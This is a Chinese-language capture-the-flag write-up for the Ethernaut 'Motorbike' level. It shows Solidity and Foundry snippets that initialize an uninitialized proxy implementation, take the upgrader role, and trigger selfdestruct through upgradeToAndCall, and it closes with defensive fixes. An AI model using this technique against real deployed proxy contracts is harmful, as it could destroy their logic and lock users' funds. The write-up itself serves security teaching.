# Motorbike

## 题目描述

[原题 in Sepolia](https://ethernaut.openzeppelin.com/level/0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6)

`Motorbike`合约使用代理调用`Engine`合约的逻辑，我们使用`Engine`合约中的逻辑时，将函数调用发送到`Motorbike`合约中，`Motorbike`合约再代理调用`Engine`合约。目标是销毁`Engine`合约，使`Motorbike`合约失效（无法代理调用）。

## 运行

根据[Foundry 官方文档](https://getfoundry.sh/)配置好运行环境后，于本项目下执行下列命令：

```sh
$ cd WTF-CTF

$ forge test -C src/Ethernaut/Motorbike -vvvvv
```

## 功能简述

`Engine`合约并没有`selfdestruct`方法，无法销毁合约。但是`Motorbike`合约在初始化`Engine`合约时，使用的是代理调用，并没有直接合约间调用。也就是说，`Engine`合约并没有初始化。我们只要找到实际的`Engine`合约地址，并将它初始化，

```
 engine = address(uint160(uint256(vm.load(motorbike, _IMPLEMENTATION_SLOT))));
```

将`upgrader`变量赋值为我的地址，

```
 Engine(engine).initialize();
```

然后再调用`upgradeToAndCall`函数

```solidity
 Engine(engine).upgradeToAndCall(address(this), abi.encodeWithSignature("done()"));
 
//function done() public {
//        selfdestruct(address(0));
//}
```

让`Engine`合约代理调用`selfdestruct`方法。即可完成目标。



合约在使用代理时，一定要注意`implementation合约`也进行了必要的初始化，以防止额外的事故发生。

比如在`implementation合约`的构造函数中使用`_disableInitializers()`，[链接](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/utils/Initializable.sol#L145)

或者在`implementation合约`的函数中使用`onlyDelegateCall函数修饰器`，以保证implementation合约中的函数不会被call。

```solidity
address immutable original;

constructor() {
	original = address(this);
}

modifier onlyDelegateCall() {
	require(address(this) != original);
	_;
}
```

